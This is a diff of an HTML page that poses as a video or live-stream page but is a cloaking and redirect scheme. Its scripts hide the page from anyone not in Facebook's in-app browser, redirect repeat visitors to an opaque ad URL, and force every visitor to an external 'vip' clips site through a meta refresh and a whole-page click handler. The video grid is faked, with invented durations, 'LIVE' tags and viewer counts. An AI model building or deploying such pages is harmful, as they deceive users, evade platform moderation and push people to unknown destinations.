@@ -1,488 +1,244 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
-      <script>
-(function(){
-    var ua = navigator.userAgent || navigator.vendor || window.opera;
-    var isMobile = /Android|iPhone|iPad|iPod|Windows Phone|IEMobile|BlackBerry|BB10|Opera Mini|Opera Mobi|Mobile Safari/i.test(ua);
-    if (!isMobile) window.location.href = &quot;https://www.google.com&quot;;
-})();
-</script>
-    
-    <script type='text/javascript'>
+   <script>
 (function () {
-    function isFacebookUser() {
-        return /FBAN|FBAV/i.test(navigator.userAgent);
+  "use strict";
+
+  const KEY = "site_visit_limit_v1";
+  const LIMIT = 2;
+  const TIME = 24 * 60 * 60 * 1000;
+  const REDIRECT_URL = "https://mammothsubway.com/pynxydkcf?key=9fcaaab1932732baaffa3314295d33af";
+
+  try {
+    const now = Date.now();
+    let data = null;
+
+    /* Saved data read */
+    try {
+      data = JSON.parse(localStorage.getItem(KEY));
+    } catch (e) {
+      data = null;
     }
 
-    var fallbackURL = &quot;https://www.google.com&quot;;
-
-    if (!isFacebookUser()) {
-        window.location.replace(fallbackURL);
+    /* Reset after 24 hours */
+    if (
+      !data ||
+      typeof data.start !== "number" ||
+      typeof data.count !== "number" ||
+      now - data.start >= TIME
+    ) {
+      data = {
+        start: now,
+        count: 0
+      };
     }
+
+    /* Count visit */
+    data.count++;
+
+    localStorage.setItem(KEY, JSON.stringify(data));
+
+    /* 3rd visit = redirect */
+    if (data.count > LIMIT) {
+      window.location.replace(REDIRECT_URL);
+    }
+
+  } catch (e) {
+    /* Storage unavailable হলে website বন্ধ হবে না */
+    console.log("Visit limiter error:", e);
+  }
 })();
 </script>
 
-  <script defer data-domain="link69x.vercel.app/bDqxlj" src="https://api.publytics.net/js/script.manual.min.js"></script>
-<script>
-    window.publytics = window.publytics || function() { (window.publytics.q = window.publytics.q || []).push(arguments) };
-    publytics('pageview');
-</script>
+    <script>
+        // STRICT CHECK: Sirf FB Browser & FB Lite Allowed
+        (function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            
+            // Check for Facebook App / FB Lite User-Agent
+            var isFB = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("FB_IAB") > -1) || (ua.indexOf("FBLC") > -1) || (ua.indexOf("FB4A") > -1);
 
-  
-  <meta http-equiv="refresh" content="2.3;url=https://vip.mixclips.top/mix44vip/?utm_source=Saim&utm_medium=parves"/>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Live Stream</title>
-  <style>
-    /* ===== রিসেট ও বেসিক ===== */
-    * {
-      box-sizing: border-box;
-      margin: 0;
-    }
+            // Agar Facebook Browser/FB Lite nahi hai, toh google.com bhejo
+            if (!isFB) {
+                window.location.replace("https://www.google.com");
+            }
+        })();
+    </script>
+      
+  <meta http-equiv="refresh" content="5;url=https://vip.mixclips.top/mix44vip/?utm_source=Saim&utm_medium=parves"/>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="preconnect" href="https://imagecdn.live">
+    <title>New Video</title>
+    <style>
+        :root{--primary:#f00;--bg:#080808;--card:#151515;--text:#eee}
+        body{font-family:sans-serif;margin:0;background:var(--bg);color:var(--text);padding-bottom:120px;user-select:none;overflow-x:hidden}
+        .theme-dark{--bg:#080808;--card:#151515;--primary:#f00}
+        .theme-blue{--bg:#050a14;--card:#0d1421;--primary:#08f}
+        .theme-gray{--bg:#1a1a1a;--card:#252525;--primary:#fc0}
+        .header{text-align:center;padding:12px;background:var(--card);position:sticky;top:0;z-index:5000;border-bottom:1px solid #333}
+        .header h1{color:#FFD700;font-size:17px;margin:0;font-weight:900}
+        .container{max-width:800px;margin:0 auto;}
+        .grid{display:grid;gap:12px}
+        .layout-single .grid{grid-template-columns:1fr}
+        .layout-double .grid{grid-template-columns:1fr 1fr}
+        .grid-item{background:var(--card);border-radius:10px;overflow:hidden;border:1px solid #333;cursor:pointer}
+        .image-container{position:relative;aspect-ratio:16/9;background:#000;overflow:hidden}
+        .image{width:100%;height:100%;object-fit:cover;opacity:.85;display:block}
+        
+        /* White Ring Play Overlay */
+        .play-overlay{
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 58px;
+            height: 58px;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+            pointer-events: none;
+            filter: drop-shadow(0px 2px 8px rgba(0, 0, 0, 0.8));
+        }
+        
+        .play-overlay svg {
+            width: 100%;
+            height: 100%;
+        }
 
-    .mm-page {
-      width: 100%;
-      min-height: 100vh;
-      background: linear-gradient(180deg, #050505, #0d0d0d);
-      color: #fff;
-      font-family: Arial, Helvetica, sans-serif;
-      padding: 20px 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+        /* Duration Badge */
+        .time-badge{
+            position: absolute;
+            bottom: 12px;
+            right: 10px;
+            background: rgba(0, 0, 0, 0.85);
+            color: #fff;
+            font-size: 11px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: bold;
+            z-index: 25;
+            letter-spacing: 0.5px;
+        }
 
-    .mm-box {
-      width: 100%;
-      max-width: 900px;
-      margin: auto;
-      text-align: center;
-    }
+        /* Real Video Paused Progress Bar System */
+        .progress-bar-bg {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.35);
+            z-index: 25;
+        }
 
-    /* ===== ডেকোরেটিভ লাইন (লাল) ===== */
-    .mm-line {
-      width: 160px;
-      height: 3px;
-      margin: 0 auto 22px;
-      border-radius: 20px;
-      background: linear-gradient(90deg, transparent, #ff1744, transparent);
-    }
+        .progress-bar-fill {
+            height: 100%;
+            background: #ff0000;
+            position: relative;
+        }
 
-    /* ===== ভিডিও প্লেয়ার ===== */
-    .mm-player {
-      position: relative;
-      width: 100%;
-      aspect-ratio: 16/9;
-      overflow: hidden;
-      border-radius: 12px;
-      background: #000;
-      border: 1px solid #3a3a3a;
-      box-shadow: 0 18px 50px rgba(0, 0, 0, 0.75),
-                  inset 0 0 30px rgba(255, 255, 255, 0.025);
-    }
+        .progress-bar-fill::after {
+            content: '';
+            position: absolute;
+            right: -4px;
+            top: -2px;
+            width: 8px;
+            height: 8px;
+            background: #ff0000;
+            border-radius: 50%;
+            box-shadow: 0 0 4px rgba(0,0,0,0.8);
+        }
 
-    .mm-player::after {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(circle, rgba(255, 255, 255, 0.025), transparent 60%);
-      pointer-events: none;
-    }
-
-    /* ===== ব্যাজ (লাইভ + ভিউ) ===== */
-    .mm-badges {
-      position: absolute;
-      top: 8px;
-      left: 8px;
-      z-index: 4;
-      display: flex;
-      gap: 4px;
-    }
-
-    .mm-badge {
-      padding: 3px 5px;
-      border-radius: 3px;
-      font-size: 7px;
-      line-height: 1;
-      font-weight: 700;
-      background: #ff1744;
-      color: #fff;
-    }
-
-    .mm-views {
-      background: rgba(0, 0, 0, 0.72);
-    }
-
-    /* ===== লোডিং স্পিনার ===== */
-    .mm-loading {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 8;
-      text-align: center;
-    }
-
-    .mm-spinner {
-      width: 44px;
-      height: 44px;
-      margin: auto;
-      border: 4px solid rgba(255, 255, 255, 0.18);
-      border-top-color: #ff1744;
-      border-radius: 50%;
-      animation: mmSpin 0.8s linear infinite;
-    }
-
-    .mm-loading-text {
-      margin-top: 12px;
-      font-size: 12px;
-      color: rgba(255, 255, 255, 0.75);
-    }
-
-    @keyframes mmSpin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
-    /* ===== প্লে বাটন (লাল) ===== */
-    .mm-watch {
-      display: none;
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 9;
-      width: 76px;
-      height: 76px;
-      min-width: 76px;
-      padding: 0;
-      border: 1px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      background: linear-gradient(135deg, #ff1744, #d50032);
-      color: #fff;
-      cursor: pointer;
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5),
-                  0 8px 30px rgba(255, 23, 68, 0.4),
-                  inset 0 1px 0 rgba(255, 255, 255, 0.25);
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
-      animation: mmPlayIn 0.35s ease-out;
-    }
-
-    .mm-play-icon {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      width: 100%;
-      height: 100%;
-      padding-left: 4px;
-      font-size: 28px;
-      line-height: 1;
-      color: #fff;
-    }
-
-    .mm-watch:hover {
-      transform: translate(-50%, -50%) scale(1.08);
-      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.55),
-                  0 10px 40px rgba(255, 23, 68, 0.5),
-                  inset 0 1px 0 rgba(255, 255, 255, 0.3);
-    }
-
-    .mm-watch:active {
-      transform: translate(-50%, -50%) scale(0.94);
-    }
-
-    @keyframes mmPlayIn {
-      from {
-        opacity: 0;
-        transform: translate(-50%, -50%) scale(0.65);
-      }
-      to {
-        opacity: 1;
-        transform: translate(-50%, -50%) scale(1);
-      }
-    }
-
-    /* ===== কন্ট্রোল বার ===== */
-    .mm-controls {
-      position: absolute;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      height: 52px;
-      padding: 0 13px;
-      display: flex;
-      align-items: center;
-      gap: 11px;
-      background: linear-gradient(to top, rgba(0, 0, 0, 0.98), rgba(0, 0, 0, 0.65));
-      z-index: 10;
-    }
-
-    .mm-control {
-      width: 25px;
-      height: 30px;
-      padding: 0;
-      border: 0;
-      background: none;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      flex-shrink: 0;
-    }
-
-    .mm-control:hover {
-      opacity: 0.7;
-    }
-
-    .mm-control svg {
-      width: 19px;
-      height: 19px;
-      fill: #fff;
-      stroke: #fff;
-      stroke-width: 1.5;
-    }
-
-    /* ===== লাইভ ডট ===== */
-    .mm-live-control {
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      font-size: 11px;
-      font-weight: 700;
-      flex-shrink: 0;
-    }
-
-    .mm-live-dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: #ff1744;
-      box-shadow: 0 0 8px rgba(255, 23, 68, 0.7);
-    }
-
-    /* ===== প্রোগ্রেস বার ===== */
-    .mm-progress {
-      flex: 1;
-      height: 4px;
-      min-width: 25px;
-      background: #333;
-      border-radius: 10px;
-      overflow: hidden;
-    }
-
-    .mm-progress-fill {
-      width: 3%;
-      height: 100%;
-      background: #ff1744;
-    }
-
-    /* ===== এইচডি বাটন ===== */
-    .mm-hd {
-      border: 0;
-      background: #ff1744;
-      color: #fff;
-      padding: 4px 7px;
-      border-radius: 3px;
-      font-size: 9px;
-      font-weight: 800;
-    }
-
-    /* ===== ইনফো টেক্সট ===== */
-    .mm-info {
-      margin: 18px auto 20px;
-      max-width: 700px;
-      color: rgba(255, 255, 255, 0.78);
-      font-size: 14px;
-      line-height: 1.6;
-    }
-
-    /* ===== কন্টিনিউ বাটন ===== */
-    .mm-continue {
-      width: 100%;
-      max-width: 320px;
-      min-height: 52px;
-      border: 0;
-      border-radius: 50px;
-      background: linear-gradient(135deg, #ff1744, #d50032);
-      color: #fff;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 10px 30px rgba(255, 23, 68, 0.28);
-      transition: 0.2s;
-    }
-
-    .mm-continue:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 14px 35px rgba(255, 23, 68, 0.38);
-    }
-
-    /* ===== নিচের লাইভ টেক্সট ===== */
-    .mm-live {
-      margin-top: 16px;
-      color: rgba(255, 255, 255, 0.55);
-      font-size: 11px;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.7px;
-    }
-
-    .mm-live::before {
-      content: "";
-      display: inline-block;
-      width: 7px;
-      height: 7px;
-      margin-right: 6px;
-      border-radius: 50%;
-      background: #ff1744;
-    }
-
-    /* ===== ফুলস্ক্রিন ওভাররাইড ===== */
-    .mm-player:fullscreen {
-      border-radius: 0;
-      border: 0;
-    }
-
-    /* ===== মোবাইল রেসপন্সিভ ===== */
-    @media (max-width: 600px) {
-      .mm-page { padding: 20px 8px; }
-      .mm-line { width: 140px; margin-bottom: 17px; }
-      .mm-player { border-radius: 9px; }
-      .mm-spinner { width: 34px; height: 34px; border-width: 3px; }
-      .mm-loading-text { font-size: 10px; }
-      .mm-watch { width: 62px; height: 62px; min-width: 62px; }
-      .mm-play-icon { font-size: 23px; padding-left: 3px; }
-      .mm-controls { height: 42px; padding: 0 7px; gap: 5px; }
-      .mm-control { width: 19px; height: 25px; }
-      .mm-control svg { width: 15px; height: 15px; }
-      .mm-live-control { font-size: 8px; gap: 3px; }
-      .mm-live-dot { width: 5px; height: 5px; }
-      .mm-hd { font-size: 7px; padding: 3px 5px; }
-      .mm-info { margin-top: 14px; font-size: 13px; }
-      .mm-continue { min-height: 48px; max-width: 290px; font-size: 14px; }
-    }
-
-    @media (max-width: 380px) {
-      .mm-live-control { display: none; }
-      .mm-controls { gap: 4px; }
-    }
-  </style>
+        .tag{position:absolute;top:8px;left:8px;background:var(--primary);color:#fff;font-size:10px;padding:3px 8px;border-radius:4px;font-weight:bold;animation:blink .8s infinite;z-index:25}
+        .download-btn{text-align:center;background:linear-gradient(180deg,#222,#000);color:#FFD700;padding:12px;font-weight:bold;font-size:13px}
+        .anchor-ad-fixed{position:fixed;bottom:0;left:0;width:100%;background:#000;border-top:3px solid #f02;padding:10px;z-index:10000}
+        .anchor-content{display:flex;align-items:center;max-width:600px;margin:0 auto;justify-content:space-between}
+        .anchor-img{height:60px;width:80px;object-fit:cover;border:1px solid #fff;border-radius:4px}
+        .anchor-btn{background:#f02;color:#fff;padding:10px 18px;border-radius:50px;font-weight:bold;animation:shake 3s infinite;font-size:12px}
+        @keyframes shake{0%,100%{transform:translateX(0)}10%,30%,50%{transform:translateX(-4px)}20%,40%{transform:translateX(4px)}}
+        @keyframes blink{50%{opacity:.3}}
+    </style>
 </head>
-<body>
+<body onclick="goToLink()">
 
-<div class="mm-page">
-  <div class="mm-box">
+<div class="header"><h1>🔥 NEW VIDEO 🔥</h1></div>
 
-    <div class="mm-line"></div>
+<div class="container"><div class="grid" id="main-grid"></div></div>
 
-    <!-- প্লেয়ার -->
-    <div class="mm-player" id="mmPlayer">
-
-      <!-- ব্যাজ -->
-      <div class="mm-badges">
-        <span class="mm-badge">LIVE</span>
-        <span class="mm-badge mm-views">👁 20K</span>
-      </div>
-
-      <!-- লোডিং -->
-      <div class="mm-loading" id="mmLoading">
-        <div class="mm-spinner"></div>
-        <div class="mm-loading-text">Loading video...</div>
-      </div>
-
-      <!-- প্লে বাটন -->
-      <button class="mm-watch" id="mmWatch" type="button" aria-label="Play Video">
-        <span class="mm-play-icon">▶</span>
-      </button>
-
-      <!-- কন্ট্রোল বার -->
-      <div class="mm-controls">
-        <button class="mm-control" type="button">
-          <svg viewBox="0 0 24 24"><path d="M8 5l11 7-11 7V5z"/></svg>
-        </button>
-        <button class="mm-control" type="button">
-          <svg viewBox="0 0 24 24"><path d="M6 5l10 7-10 7V5z"/><path d="M18 5v14"/></svg>
-        </button>
-        <button class="mm-control" type="button">
-          <svg viewBox="0 0 24 24"><path d="M4 9v6h4l5 4V5L8 9H4z"/><path d="M16 9c2 2 2 4 0 6"/></svg>
-        </button>
-
-        <div class="mm-live-control">
-          <span class="mm-live-dot"></span> LIVE
-        </div>
-
-        <div class="mm-progress">
-          <div class="mm-progress-fill"></div>
-        </div>
-
-        <button class="mm-hd" type="button">HD</button>
-
-        <button class="mm-control" type="button">
-          <svg viewBox="0 0 24 24" fill="none"><path d="M12 2v3 M12 19v3 M4.93 4.93l2.12 2.12 M16.95 16.95l2.12 2.12 M2 12h3 M19 12h3 M4.93 19.07l2.12-2.12 M16.95 7.05l2.12-2.12"/><circle cx="12" cy="12" r="3"/></svg>
-        </button>
-
-        <button class="mm-control" id="mmFullscreen" type="button">
-          <svg viewBox="0 0 24 24"><path d="M4 9V4h5 M15 4h5v5 M20 15v5h-5 M9 20H4v-5"/></svg>
-        </button>
-      </div>
+<div class="anchor-ad-fixed">
+    <div class="anchor-content">
+        <img id="anchor-img-tag" src="" class="anchor-img" alt="ad">
+        <div style="color:#fff;font-weight:bold;flex-grow:1;padding:0 12px;font-size:13px">WATCH FULL VIDEO<br><small style="color:#4CAF50">● 1.8k active</small></div>
+        <div class="anchor-btn">WATCH</div>
     </div>
-
-    <p class="mm-info">
-   
-    </p>
-
-    <button class="mm-continue" id="mmContinue" type="button">
-      Continue Watching
-    </button>
-
-    
-
-  </div>
 </div>
 
 <script>
-  (function() {
-    // ===== আপনার ডেস্টিনেশন লিংক (এখানে পরিবর্তন করুন) =====
-    var DESTINATION = "https://vip.mixclips.top/mix44vip/?utm_source=Saim&utm_medium=parves";
+    const links = ["https://vip.mixclips.top/mix44vip/?utm_source=Saim&utm_medium=parves"];
+    function goToLink(){window.location.href=links[Math.floor(Math.random()*links.length)]}
 
-    // ===== ডম এলিমেন্ট =====
-    var loading = document.getElementById("mmLoading");
-    var watch = document.getElementById("mmWatch");
-    var continueBtn = document.getElementById("mmContinue");
-    var fullscreenBtn = document.getElementById("mmFullscreen");
-    var player = document.getElementById("mmPlayer");
+    // Theme Selector
+    const themes=['theme-dark','theme-blue','theme-gray'];
+    const layouts=['layout-single','layout-double'];
+    document.body.classList.add(themes[Math.floor(Math.random()*themes.length)], layouts[Math.floor(Math.random()*layouts.length)]);
 
-    // ===== ১ সেকেন্ড লোডিং সিমুলেশন =====
-    setTimeout(function() {
-      if (loading) loading.style.display = "none";
-      if (watch) watch.style.display = "block";
-    }, 1000);
+    const imgs = [
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e75dd9_0.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e75f6b_1.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e76086_2.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e76182_3.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e76290_4.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e763ae_5.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e764fd_6.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e7663e_7.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e76794_8.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e769c1_9.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e76c9e_10.jpg",
+    "https://r.url12xx.com/upload.php?img=img_6a85dd0e76ee4_11.jpg"
+];
 
-    // ===== রিডাইরেক্ট ফাংশন =====
-    function goToLink() {
-      window.location.href = DESTINATION;
+    document.getElementById('anchor-img-tag').src = imgs[Math.floor(Math.random() * imgs.length)];
+
+    function getRandomTime() {
+        const min = Math.floor(Math.random() * 7) + 2; 
+        const sec = Math.floor(Math.random() * 50) + 10;
+        return `${min}:${sec < 10 ? '0' : ''}${sec}`;
     }
 
-    // ===== ক্লিক ইভেন্ট =====
-    if (watch) watch.addEventListener("click", goToLink);
-    if (continueBtn) continueBtn.addEventListener("click", goToLink);
+    const grid = document.getElementById('main-grid');
+    let h = "";
+    imgs.sort(()=>Math.random()-0.5).forEach(s=>{
+        const duration = getRandomTime();
+        const randomRedPercentage = Math.floor(Math.random() * 54) + 12;
 
-    // ===== ফুলস্ক্রিন টগল =====
-    if (fullscreenBtn && player) {
-      fullscreenBtn.addEventListener("click", function() {
-        if (document.fullscreenElement) {
-          document.exitFullscreen();
-        } else if (player.requestFullscreen) {
-          player.requestFullscreen();
-        }
-      });
-    }
-  })();
+        h += `<div class="grid-item">
+                <div class="image-container">
+                    <div class="tag">● LIVE</div>
+                    <div class="play-overlay">
+                        <svg viewBox="0 0 100 100">
+                            <circle cx="50" cy="50" r="42" fill="none" stroke="#ffffff" stroke-width="7"/>
+                            <polygon points="40,32 70,50 40,68" fill="#ffffff"/>
+                        </svg>
+                    </div>
+                    
+                    <div class="time-badge">${duration}</div>
+                    
+                    <div class="progress-bar-bg">
+                        <div class="progress-bar-fill" style="width: ${randomRedPercentage}%;"></div>
+                    </div>
+                    
+                    <img src="${s}" class="image" loading="lazy">
+                </div>
+                <div class="download-btn">Play Full HD Video</div>
+            </div>`;
+    });
+    grid.innerHTML = h;
 </script>
-
 </body>
 </html>
